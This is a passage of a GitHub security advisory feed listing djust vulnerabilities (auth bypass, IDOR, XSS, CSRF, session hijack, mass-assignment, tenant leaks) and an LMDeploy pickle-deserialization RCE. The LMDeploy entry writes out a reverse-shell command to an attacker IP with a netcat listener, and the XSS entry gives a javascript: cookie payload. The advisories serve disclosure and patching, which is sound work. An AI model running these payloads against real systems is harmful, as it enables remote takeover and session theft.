<p>Fixed in <strong>djust 1.0.7</strong>. The handshake Host is extracted from the ASGI scope, validated against <code>ALLOWED_HOSTS</code> (the same logic as the CSWSH Origin gate, parsed with Django's <code>split_domain_port</code> so malformed Hosts are rejected at the boundary), and propagated — with the TLS scheme — into the reconstructed request, so live-path tenant resolution matches HTTP exactly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround on the live path short of upgrading. Most exposed when combined with <code>STRICT_MODE=False</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-v9rj-xjfv-xj9r">https://github.com/djust-org/djust/security/advisories/GHSA-v9rj-xjfv-xj9r</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-v9rj-xjfv-xj9r">https://github.com/advisories/GHSA-v9rj-xjfv-xj9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9rj-xjfv-xj9r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-16T22:07:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust has broken object-level access control (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-c7c5-5j6r-q957</id>
        <link href="https://github.com/advisories/GHSA-c7c5-5j6r-q957"/>
        <updated>2026-09-16T22:06:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>djust's per-object authorization (<code>get_object</code> + <code>has_object_permission</code>, ADR-017) was enforced on the WebSocket <strong>mount</strong> and <strong>event</strong> paths but <strong>not</strong> on three other render entry points: (a) the initial <strong>HTTP GET</strong> render, (b) <strong>SPA <code>url_change</code></strong> navigation, and (c) <code>{% live_render %}</code> <strong>embedded child</strong> views. An authenticated user could therefore view (and on some paths act on) an object they are not authorized for by loading the page directly, navigating to it via SPA url-change, or composing it as an embedded child — a classic IDOR / broken object-level access control on object-scoped views.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. All render entry points now route through a shared <code>enforce_object_permission</code> chokepoint: HTTP GET returns <strong>403</strong>, <code>url_change</code> emits a <code>permission_denied</code> frame and skips the render, and <code>{% live_render %}</code> (eager + lazy) refuses the embed. Views without a custom <code>get_object</code> are unaffected (no-op).</p>
<h3 id="workarounds">Workarounds</h3>
<p>No reliable workaround short of upgrading. Do not expose object-scoped views through the HTTP-GET / url_change / live_render paths until patched.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-c7c5-5j6r-q957">https://github.com/djust-org/djust/security/advisories/GHSA-c7c5-5j6r-q957</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-c7c5-5j6r-q957">https://github.com/advisories/GHSA-c7c5-5j6r-q957</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7c5-5j6r-q957</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T22:06:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust's Django model serialization has no sensitive-field denylist: password hashes, privilege flags, and PII on a public view attribute are sent to the client]]></title>
        <id>https://github.com/advisories/GHSA-pvg3-6q9j-mj3x</id>
        <link href="https://github.com/advisories/GHSA-pvg3-6q9j-mj3x"/>
        <updated>2026-09-16T22:02:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When a Django <code>Model</code> instance is assigned to a <strong>public</strong> view attribute, djust serialized it to the client with <strong>no sensitive-field denylist</strong> — sending fields such as <code>password</code> (the hash), privilege flags (e.g. <code>is_staff</code> / <code>is_superuser</code>), tokens, and other PII to the browser. Because exposing model objects to templates is a normal djust pattern, this could leak credentials/PII without the developer realizing the full object crossed the wire.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. Model serialization applies a secure-by-default sensitive-field denylist (password/hash/token/secret-style fields and known privilege flags are withheld) with an identity-subset fallback.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Keep <code>Model</code> instances on <code>_private</code> attributes and expose only the specific fields needed, until patched.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-pvg3-6q9j-mj3x">https://github.com/djust-org/djust/security/advisories/GHSA-pvg3-6q9j-mj3x</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-pvg3-6q9j-mj3x">https://github.com/advisories/GHSA-pvg3-6q9j-mj3x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvg3-6q9j-mj3x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-16T22:02:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust has an authorization bypass on the WebSocket/SSE mount path]]></title>
        <id>https://github.com/advisories/GHSA-xhhm-f6hp-2qwj</id>
        <link href="https://github.com/advisories/GHSA-xhhm-f6hp-2qwj"/>
        <updated>2026-09-16T21:58:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The live (WebSocket) transport authorizes a mount via <code>check_view_auth</code>, not Django's <code>View.dispatch()</code> chain. As a result, standard Django authorization — <code>LoginRequiredMixin</code>, <code>PermissionRequiredMixin</code>, <code>UserPassesTestMixin</code>, <code>@method_decorator(login_required, name="dispatch")</code>, and custom <code>dispatch()</code> guards — <strong>and</strong> the djust admin extension's staff gate (applied only in the HTTP <code>as_view</code> wrapper) were enforced on the initial HTTP GET but <strong>silently bypassed over WebSocket</strong>, where all events and state flow. An anonymous or under-privileged client could open a WebSocket and mount such a view — including admin list/create/change/delete — and dispatch its handlers.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. <code>check_view_auth</code> now honors the Django <code>AccessMixin</code> family on every transport; a new system check <strong>S004</strong> fails loud at startup on auth patterns the runtime cannot safely replay (decorator/overridden-<code>dispatch</code> forms); and the admin base mixin declares <code>login_required = True</code> + an active-staff <code>check_permissions</code> gate.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Gate views using djust's <code>login_required</code> / <code>permission_required</code> / <code>check_permissions</code> attributes (honored on all transports) rather than HTTP-only mixins/decorators.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-xhhm-f6hp-2qwj">https://github.com/djust-org/djust/security/advisories/GHSA-xhhm-f6hp-2qwj</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-xhhm-f6hp-2qwj">https://github.com/advisories/GHSA-xhhm-f6hp-2qwj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhhm-f6hp-2qwj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-16T21:58:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: Unsigned client state snapshot is restored as trusted view state (privilege escalation / state injection)]]></title>
        <id>https://github.com/advisories/GHSA-c67v-vqrp-m5wj</id>
        <link href="https://github.com/advisories/GHSA-c67v-vqrp-m5wj"/>
        <updated>2026-09-16T21:56:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For views that opt into state snapshots, the snapshot <code>state_json</code> embedded in the client page was restored on reconnect as <strong>trusted</strong> view state with no integrity check. A client could edit the unsigned <code>state_json</code> in their page and return it in the reconnect mount frame to <strong>inject arbitrary view attributes</strong> — e.g. flip <code>is_admin</code> to <code>True</code>, or change <code>account_id</code> / <code>balance</code> — escalating privilege or tampering with business state held in public view attributes (the normal djust pattern).</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. State snapshots are signed; unsigned or forged snapshots are rejected on the back-navigation restore path.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not enable state snapshots; do not hold authorization/ownership state in public view attributes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-c67v-vqrp-m5wj">https://github.com/djust-org/djust/security/advisories/GHSA-c67v-vqrp-m5wj</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-c67v-vqrp-m5wj">https://github.com/advisories/GHSA-c67v-vqrp-m5wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c67v-vqrp-m5wj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T21:56:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: SSE sessions are not bound to the authenticated user; the client-chosen session_id is the sole authorization capability (session hijack)]]></title>
        <id>https://github.com/advisories/GHSA-f795-p5jw-j6g2</id>
        <link href="https://github.com/advisories/GHSA-f795-p5jw-j6g2"/>
        <updated>2026-09-16T21:53:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SSE sessions were keyed solely by a <strong>client-chosen</strong> <code>session_id</code> with no binding to the authenticated user — a control the WebSocket transport has but that was dropped on SSE. An attacker who learns (or a victim who leaks) a <code>session_id</code> could connect to the message endpoint and dispatch event handlers that execute with the <strong>victim's identity and state</strong>.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. Each SSE session is bound to its owning principal at creation and cross-principal access is rejected; SSE session creation is additionally capped per principal.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable the SSE transport short of upgrading.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-f795-p5jw-j6g2">https://github.com/djust-org/djust/security/advisories/GHSA-f795-p5jw-j6g2</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-f795-p5jw-j6g2">https://github.com/advisories/GHSA-f795-p5jw-j6g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f795-p5jw-j6g2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T21:53:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust is vulnerable to stored/reflected XSS via javascript: URLs in built-in component template tags]]></title>
        <id>https://github.com/advisories/GHSA-4mf4-73j6-mvrw</id>
        <link href="https://github.com/advisories/GHSA-4mf4-73j6-mvrw"/>
        <updated>2026-09-16T21:50:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Many djust built-in component template tags (<code>djust.components.templatetags.*</code>) render a developer/user-supplied URL into an <code>href</code> / <code>action</code> attribute, HTML-escaping it with <code>conditional_escape</code> but <strong>never validating the URL scheme</strong>. HTML escaping prevents attribute breakout but does not neutralize a <code>javascript:</code> URI (which needs no escapable characters), so a URL value of <code>javascript:alert(document.cookie)</code> lands verbatim in <code>&lt;a href="javascript:alert(document.cookie)"&gt;</code> and executes in the victim's session on click.</p>
<p>Affected sinks (executing href/action contexts; not exhaustive): breadcrumb (<code>djust_components.py:1535</code>; <code>_advanced.py:1999,2022</code>), <code>dj_nav</code> link/dropdown/brand (<code>djust_components.py:5632,5779,5807,5830</code>), citation URL (<code>:6936</code>), cookie-consent privacy link (<code>:8240</code>), error-page action (<code>_advanced.py:1728</code>), form <code>action</code> (<code>_forms.py:1239</code>). <code>&lt;img src&gt;</code> sinks are lower risk (javascript: does not execute via img src). No scheme validation exists anywhere in the component tags; a docstring at <code>djust_components.py:781</code> even acknowledges the <code>javascript:</code> risk without mitigating it.</p>
<p><strong>Severity Medium:</strong> XSS in the victim's authenticated session whenever an app renders one of these components with a URL sourced from user-controllable data; for <code>href</code> requires a click, worst case is the stored variant (URL persisted from one user, rendered to another). Conditional on developer usage, hence Medium rather than High.</p>
<p>Reproduced: <code>breadcrumb(items=[{"label":"Home","url":"javascript:alert(document.cookie)"}])</code> emits <code>&lt;a ... href="javascript:alert(document.cookie)"&gt;Home&lt;/a&gt;</code>; <code>JaVaScRiPt:</code> case variant also passes; <code>https://</code> URLs are preserved.</p>
<h3 id="patches">Patches</h3>
<p>Add a <code>safe_url()</code> helper that neutralizes non-allowlisted schemes (<code>javascript:</code>, <code>vbscript:</code>, <code>data:</code>) to <code>#</code> while preserving http/https/mailto/tel/relative/anchor URLs, and route every href/action/formaction/xlink:href sink through it (then HTML-escape). Add a regression + an audit_ast/system-check rule flagging un-routed URL-attribute interpolation.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not pass user-controllable URLs to the affected built-in component tags; pre-validate URL schemes in application code before binding them to component arguments.</p>
<h3 id="references">References</h3>
<p>Reproducer + finding writeup retained privately by the maintainer.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-4mf4-73j6-mvrw">https://github.com/djust-org/djust/security/advisories/GHSA-4mf4-73j6-mvrw</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-4mf4-73j6-mvrw">https://github.com/advisories/GHSA-4mf4-73j6-mvrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mf4-73j6-mvrw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-16T21:50:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust has Cross-Site Request Forgery on the Server-Sent-Events transport: a cross-origin page can drive a victim-authenticated SSE session]]></title>
        <id>https://github.com/advisories/GHSA-pg97-jvmf-qfvc</id>
        <link href="https://github.com/advisories/GHSA-pg97-jvmf-qfvc"/>
        <updated>2026-09-16T15:45:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The SSE client→server POST endpoints are <code>@csrf_exempt</code> and the SSE GET stream endpoint had no Origin check, so a cross-origin page could drive a victim-cookie-authenticated SSE session: force the victim's browser to GET the stream URL (which <strong>creates and mounts</strong> a LiveView as the victim) and POST to the message endpoint with <code>credentials: include</code> to <strong>fire state-changing event handlers as the victim</strong>. The URL <code>session_id</code> is client-chosen (validated only for UUID <em>format</em>), so it is not a CSRF token, and a JSON body sent as <code>text/plain</code> is a CORS <em>simple request</em> with no preflight.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. All three SSE endpoints validate the request <code>Origin</code> against <code>ALLOWED_HOSTS</code> (mirroring the WebSocket CSWSH defense) and reject cross-origin requests with <strong>403</strong>; the POST endpoints additionally require <code>Content-Type: application/json</code> (<strong>415</strong> otherwise), closing the <code>text/plain</code> simple-request bypass.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable the SSE transport, or front it with a proxy that enforces an Origin allowlist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-pg97-jvmf-qfvc">https://github.com/djust-org/djust/security/advisories/GHSA-pg97-jvmf-qfvc</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-pg97-jvmf-qfvc">https://github.com/advisories/GHSA-pg97-jvmf-qfvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pg97-jvmf-qfvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T15:45:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy]]></title>
        <id>https://github.com/advisories/GHSA-5h8j-6crg-7rmw</id>
        <link href="https://github.com/advisories/GHSA-5h8j-6crg-7rmw"/>
        <updated>2026-09-16T15:34:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>The LMdeploy&nbsp;implements an&nbsp;rpc server (AsyncRPCServer in zmq_rpc.py)&nbsp;for supporting the RPC communications. In its core functionality&nbsp;call_and_response(), I found it will directly use the&nbsp;pickles.loads()&nbsp;to deserialize the received messages without any sanitization, hence resulting in a remote code execution vulnerability by this RPC server.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<ul>
<li><p>Step1:
The victim user starts a RPC server that connects to its network interface. We give our example code (server.py) in the attachment, you can reproduce directly with server.py.</p>
</li>
<li><p>Step2:
The attacker can then send malicious pickle dump data to the remote RPC address for the attack. We give a example to show how can an attacker acquire a command shell:</p>
<img width="832" height="324" alt="image" src="https://github.com/user-attachments/assets/03b9654d-e25b-4e93-903a-2aae8b12e704"></li>
</ul>
<p>In this example, attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command “bash -c ‘bash -i &gt;&amp; /dev/tcp/202.112.47.27/4444 0&gt;&amp;1’”, where 202.112.47.27 is an attacker’s server. 
Two points require special attention:
1.The client code originally only connects to localhost over a socket, but an attacker can easily change localhost to another IP to perform remote exploitation, because the RPC server does not validate the connecting IP.
2.The RPC server’s port is randomized, but an attacker can still scan ports to find and exploit it; in our demo we explicitly set the target port.</p>
<ul>
<li>Step3:
Attacker can use nc tool (nc -l 4444) to create a reverse shell and wait for connection. Then, attacker runs the client to send the malicious request. Since the pickle deserialization vulnerability, the victim rpc server will execute the malicious command and consequently let attacker get the command shell of victim machine.</li>
</ul>
<p>We also give a demo video in the attachment, along with modified zmq_rpc.py. When you reproduce this issue in the client side (as an attacker), you can first replace zmq_rpc.py in pip site-packages with provided zmq_rpc.py in the attachment and then run python poc.py {port}.</p>
<h3 id="impact">Impact</h3>
<p>Remote code execution in the victim's machine over network. Once the victim starts the RPC server, an attacker on the network can gain arbitrary code execution by scanning and finding the victim’s service.</p>
<h3 id="mitigation">Mitigation</h3>
<p>(1)Sanitize&nbsp;data before&nbsp;pickle.loads&nbsp;it (e.g., rewrite Unpickler.find_class to set a whitelist), or use more secure deserialization methods such as&nbsp;safetensor&nbsp;or&nbsp;msgpack&nbsp;to replace the insecure pickle.loads.
(2)Enable authentication in RPC services to ensure that only authenticated and trusted users are permitted to join the same cluster.
<a href="https://github.com/user-attachments/files/22589686/LMdeploy.zip">LMdeploy.zip</a></p>
<h3 id="maintainer-assessment">Maintainer assessment</h3>
<p>This advisory tracks remotely reachable arbitrary code execution caused by deserializing untrusted ZMQ RPC messages with <code>pickle.loads()</code>.</p>
<p>The vulnerable RPC implementation was introduced in LMDeploy 0.9.1. Before version 0.10.2, <code>AsyncRPCServer</code> bound to <code>tcp://*</code>, allowing a network peer that could reach the randomly selected RPC port to submit a malicious pickle payload.</p>
<p>Version 0.10.2 changed the RPC server binding to localhost, removing the remote network attack surface. The RPC protocol still uses pickle internally, so the loopback RPC endpoint must remain inaccessible to untrusted local processes.</p>
<p>Additional client-side <code>pickle.loads()</code> call sites identified in a duplicate report are part of the same trusted internal RPC protocol and have been retained here as supporting evidence.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/InternLM/lmdeploy/security/advisories/GHSA-5h8j-6crg-7rmw">https://github.com/InternLM/lmdeploy/security/advisories/GHSA-5h8j-6crg-7rmw</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/releases/tag/v0.10.2">https://github.com/InternLM/lmdeploy/releases/tag/v0.10.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5h8j-6crg-7rmw">https://github.com/advisories/GHSA-5h8j-6crg-7rmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h8j-6crg-7rmw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-16T15:34:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: Multi-tenant isolation fails open on the WebSocket/SSE path, disclosing other tenants' data]]></title>
        <id>https://github.com/advisories/GHSA-3492-cvg7-9mr2</id>
        <link href="https://github.com/advisories/GHSA-3492-cvg7-9mr2"/>
        <updated>2026-09-16T15:32:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>djust.tenants</code> isolation was enforced only on the HTTP path. The current tenant was stored in <code>threading.local()</code> and set exclusively by the HTTP-only <code>TenantMiddleware</code>, so on the live (WebSocket/SSE) path <code>get_current_tenant()</code> was always <code>None</code> during mount and every event handler — and the tenant-aware <code>QuerySet</code> manager failed <strong>OPEN</strong> (returned the unfiltered queryset, ignoring <code>STRICT_MODE</code>), disclosing <strong>every</strong> tenant's rows to whoever held the socket. <code>threading.local</code> was additionally shared across connections on the <code>sync_to_async</code> executor thread.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>djust 1.0.7</strong>. Tenant storage moved to a <code>contextvars.ContextVar</code> (per async task); the resolved tenant is bound around WS/SSE mount and every dispatch; both managers scope the base queryset once and fail <strong>CLOSED</strong> (<code>.none()</code> under the default <code>STRICT_MODE</code>); and system check <strong>S006</strong> warns when <code>STRICT_MODE=False</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround on the live path short of upgrading.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-3492-cvg7-9mr2">https://github.com/djust-org/djust/security/advisories/GHSA-3492-cvg7-9mr2</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-3492-cvg7-9mr2">https://github.com/advisories/GHSA-3492-cvg7-9mr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3492-cvg7-9mr2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T15:32:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: Client mass-assignment of arbitrary view attributes via the default dj-model update_model handler]]></title>
        <id>https://github.com/advisories/GHSA-cc7c-9jff-58wj</id>
        <link href="https://github.com/advisories/GHSA-cc7c-9jff-58wj"/>
        <updated>2026-09-16T13:55:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>djust.mixins.model_binding.ModelBindingMixin</code> provides a default <code>update_model</code> event handler and is part of the <strong>LiveView base MRO</strong>, so every LiveView exposes it. It <code>setattr</code>s a view attribute whose <strong>name is client-supplied</strong> (<code>field</code>), gated only by: reject <code>_</code>-prefixed names; reject a <strong>14-entry denylist</strong> of framework internals (<code>FORBIDDEN_MODEL_FIELDS</code>); optional <code>allowed_model_fields</code> which <strong>defaults to None = allow all</strong>; and <code>hasattr</code> existence.</p>
<p>Result: a client can set <strong>any public, existing view attribute — not just the fields actually bound with <code>dj-model=</code> in the rendered template</strong>. The denylist covers framework plumbing but nothing about developer business/authz state, and the allowlist is opt-in (off by default). A developer who binds one <code>dj-model="search"</code> input and also keeps <code>self.account_id</code> / <code>self.is_admin</code> / <code>self.total_price</code> as view state does not realize a client can set ALL of them via <code>{type:event, event:"update_model", params:{field, value}}</code> over the WebSocket. Type coercion matches the target attribute's type (so <code>"true"</code> -&gt; bool True), aiding the attacker.</p>
<p><strong>Severity High</strong> for apps that hold authorization/ownership/business state in public view attributes (the normal djust pattern) -&gt; state tampering / IDOR / authz-flag manipulation; Low otherwise. Default-on across every LiveView. For a public (no-login) view an anonymous client can mass-assign; for an authenticated view a logged-in user can tamper their own session's view state (the IDOR/authz vector when downstream handlers act on it without re-authorizing).</p>
<p>Reproduced: a view with <code>account_id/is_admin/total_price</code> (none bound with dj-model) had all three set via <code>update_model</code> calls.</p>
<h3 id="patches">Patches</h3>
<p>Restrict the default handler to fields actually exposed via <code>dj-model=</code>: have the template renderer record the bound-field set per render and reject any <code>field</code> outside it (preferred, secure + zero-config); or make <code>allowed_model_fields</code> fail-closed (required). Keep <code>FORBIDDEN_MODEL_FIELDS</code> only as defense-in-depth. Add a regression that a non-<code>dj-model</code> public attribute (e.g. <code>is_admin</code>) is rejected while a bound field still updates.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>allowed_model_fields</code> explicitly on every view using dj-model (or subclassing LiveView) to the minimal list of bindable fields; do not keep authorization/ownership state in public view attributes that share the view with dj-model bindings.</p>
<h3 id="references">References</h3>
<p>Reproducer + finding writeup retained privately by the maintainer.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-cc7c-9jff-58wj">https://github.com/djust-org/djust/security/advisories/GHSA-cc7c-9jff-58wj</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-cc7c-9jff-58wj">https://github.com/advisories/GHSA-cc7c-9jff-58wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc7c-9jff-58wj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T13:55:48.000Z</published>
    </entry>
</feed>